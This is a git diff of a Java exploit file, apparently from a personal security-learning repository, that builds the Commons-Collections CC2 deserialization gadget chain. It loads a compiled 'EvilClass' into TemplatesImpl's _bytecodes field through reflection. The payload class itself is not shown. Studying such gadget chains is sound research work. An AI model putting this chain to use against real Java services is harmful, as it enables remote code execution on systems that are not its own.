@@ -12,7 +12,10 @@ import java.nio.file.Paths;
 import java.util.PriorityQueue;
 
 public class Cc2 {
-    public static Object Cc2() throws Exception {
+
+    public static String classFilePath="F:\\code\\java\\all-javasec-code\\commons-c_chain_Exp\\target\\classes\\com\\yyjccc\\EvilClass\\ExpClassLoad.class";
+
+    public static Object cc2() throws Exception {
         TemplatesImpl templates= new TemplatesImpl();
 
         Class tc=templates.getClass();
@@ -22,7 +25,7 @@ public class Cc2 {
         Field bytecodefield = tc.getDeclaredField("_bytecodes");
         bytecodefield.setAccessible(true);
         //赋给我们的字节码,二维数组，代码会循环遍历
-        byte[] code= Files.readAllBytes(Paths.get("D:\\coderesp\\java\\learn\\exp\\target\\classes\\org\\example\\test.class"));;
+        byte[] code= Files.readAllBytes(Paths.get(classFilePath));;
         byte [][]  codes={code};
         bytecodefield.set(templates,codes);
 
